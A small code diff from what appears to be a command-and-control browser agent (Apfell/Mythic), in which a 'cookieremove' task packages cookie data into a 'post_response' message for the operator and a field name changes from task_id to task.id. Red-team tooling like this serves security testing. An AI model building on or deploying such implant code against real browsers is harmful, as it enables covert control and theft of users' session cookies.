@@ -7,7 +7,7 @@ cookieremove = function(task) {
         } else {
             resp = JSON.stringify(cookie, null, 2);
         }
-        let response = {'task_id':task.task_id, 'user_output':resp, 'completed':true};
+        let response = {'task_id':task.id, 'user_output':resp, 'completed':true};
         let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
         let enc = JSON.stringify(outer_response);
         let final = apfell.apfellid + enc;
